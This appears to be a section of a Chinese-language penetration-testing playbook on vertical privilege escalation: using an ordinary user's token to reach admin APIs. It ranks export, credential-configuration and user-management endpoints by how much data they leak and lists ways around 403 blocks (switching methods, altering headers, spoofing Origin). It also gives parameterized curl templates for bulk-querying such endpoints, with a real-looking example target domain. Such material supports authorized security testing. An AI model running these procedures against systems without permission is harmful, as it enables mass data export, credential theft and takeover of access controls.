# §26 VertPrivEsc（垂直越权 — 专用决策树）
> 垂直越权是贡献最多严重漏洞的阶段——普通用户 Token 访问管理后台 API 可导致全量数据导出、凭证泄露、权限管理失控。

### 识别信号
- 已获取任意有效 Token/JWT/Cookie（普通用户权限）
- 已发现管理相关路径（/admin/ /manage/ /system/ /console/ 等）
- JS 或路由中包含 user/role/perm/config/export/sync 等管理功能关键字

### 决策流程

```
已获取普通用户 Token?
├── 步骤1: 收集管理API清单
│   ├── JS中搜索管理关键字: /admin/ /manage/ /system/ /console/ /boss/ /backend/
│   │   /user/ /role/ /perm/ /config/ /settings/ /export/ /sync/ /audit/ /log/
│   ├── Phase 1 提取的全部API端点中筛选含上述关键字的路径
│   ├── 雪瞳注入结果中的路由，筛选 /manage/* /admin/* 等管理前缀
│   └── 额外关注: 与当前业务领域相关的管理前缀（如 /order-manage/ /member-admin/）
│
├── 步骤2: 逐条测试（用普通用户 Token）
│   ├── 对每个管理端点发请求，附带普通用户 Token
│   ├── 重点优先顺序（按数据泄露风险降序）:
│   │   ├── 导出/下载类: *export*, *download*, *report*, *dump*
│   │   │   → 数据导出（最高危：一次性全量泄露）
│   │   ├── 列表/查询类: *list*, *query*, *search*, *all*
│   │   │   → 全量数据（高危：分页可遍历全量）
│   │   ├── 邮箱/凭证配置类: *email*, *mail*, *smtp*, *config*, *settings*
│   │   │   → 凭证泄露（严重：明文密码/密钥）
│   │   ├── 用户/权限管理类: *user*, *role*, *permission*, *account*
│   │   │   → 权限失控（高危：可创建/修改/删除用户）
│   │   ├── 业务数据类: *personnel*, *staff*, *employee*, *member*, *order*, *finance*
│   │   │   → 敏感业务数据（中危-高危：取决于数据类型）
│   │   └── 写操作类: *update*, *insert*, *create*, *delete*, *remove*, *sync*
│   │       → 数据篡改（高危：可修改/删除数据）
│   └── 方法切换: GET 返回 403 → 换 POST/PUT/PATCH/DELETE
│       部分网关对 GET 有权限控制但对 POST 没有（配置漏洞）
│
├── 步骤3: 如果 Token 能访问管理接口
│   ├── = 垂直越权确认（严重）
│   ├── 立即提取响应中的 total/count/size/summary 判断数据量级
│   ├── 对 export 接口 → 导出文件确认数据泄露量
│   ├── 对响应做敏感字段扫描（password/token/key/secret 等）
│   └── 触发 Phase 3.5: 用管理端点发现的敏感数据回溯其他 Phase
│
└── 步骤4: 如果 GET 全部返回 403
    ├── 尝试移除 Content-Type header
    ├── 尝试不同 Accept headers（application/json vs text/html vs */*）
    ├── 尝试在 POST body 中仅传 {}（有些网关POST不拦截空body）
    ├── 尝试添加 Origin/Referer 为管理后台域名
    └── 记录 "垂直越权已测试，{N}个端点，无发现" 到 findings
```

### Payload 模板（通用参数化）

```
# 批量测试模板（curl）— {TOKEN_HEADER} 替换为实际的 header 名 (token/Authorization/X-Auth-Token)
TOKEN="{YOUR_TOKEN}"

# 类型1: 导出类接口（最高危 — 全量数据一次性导出）
# 对每个发现的 export/download/report 端点:
curl -sk -H "{TOKEN_HEADER}: ${TOKEN}" -X {METHOD} \
  -H "Content-Type: application/json" -d '{}' \
  "https://{TARGET}/{PREFIX}/{EXPORT_ENDPOINT}" -o export_result

# 类型2: 列表类接口（高危 — 检查 total/count 字段）
# 对每个发现的 list/query/search 端点:
curl -sk -H "{TOKEN_HEADER}: ${TOKEN}" -X {METHOD} \
  -H "Content-Type: application/json" \
  -d '{"pageNum":1,"pageSize":5}' "https://{TARGET}/{PREFIX}/{LIST_ENDPOINT}"
# → 关键: 检查响应中的 total/count/size/summary = 全量数据条数

# 类型3: 配置/凭证类接口（严重 — 可能含明文密码/密钥）
# 对每个 config/settings/email/smtp 端点:
curl -sk -H "{TOKEN_HEADER}: ${TOKEN}" -X {METHOD} \
  -H "Content-Type: application/json" -d '{}' \
  "https://{TARGET}/{PREFIX}/{CONFIG_ENDPOINT}"
# → 关键: 检查响应中是否有 password/secret/key/token 字段

# 类型4: 用户/权限管理类接口（高危）
curl -sk -H "{TOKEN_HEADER}: ${TOKEN}" -X {METHOD} \
  -H "Content-Type: application/json" \
  -d '{"pageNum":1,"pageSize":10}' "https://{TARGET}/{PREFIX}/{USER_MANAGE_ENDPOINT}"

# 类型5: 业务数据类接口（中危-高危）
curl -sk -H "{TOKEN_HEADER}: ${TOKEN}" -X {METHOD} \
  -H "Content-Type: application/json" \
  -d '{"pageNum":1,"pageSize":5}' "https://{TARGET}/{PREFIX}/{BUSINESS_DATA_ENDPOINT}"

# 变量替换规则:
# {TARGET} = 目标域名（如 ups.jclps.com）
# {PREFIX} = API前缀（如 orderSystem、api、v1）
# {METHOD} = 从 JS/网络请求中观察到的实际 HTTP 方法（通常POST）
# {TOKEN_HEADER} = 从响应/JS中观察到的实际token header名（token/Authorization/X-Auth-Token）
# {ENDPOINT} = 从 JS/路由/API清单中提取的实际端点路径
```

### 关联漏洞
- 响应敏感内容自动扫描 → Phase 2 Step 0.5
- ACK 自动注入 → Phase 3 Rule 3
- 导出接口检测 → discovery-amplification.md Rule 6

---
